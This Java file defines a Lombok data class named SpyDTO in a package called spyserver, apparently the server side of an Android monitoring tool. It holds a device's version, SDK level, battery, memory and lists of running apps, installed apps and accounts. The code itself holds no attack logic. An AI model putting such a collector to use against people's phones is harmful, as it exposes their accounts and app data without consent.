package com.example.spyserver;

import lombok.Getter;
import lombok.Setter;
import lombok.ToString;

import java.util.List;

@Getter
@Setter
@ToString
public class SpyDTO {
    private String version;
    private int sdk;
    private int battery;
    private long memory;

    private List<String> running;
    private List<String> installed;
    private List<String> accounts;
}
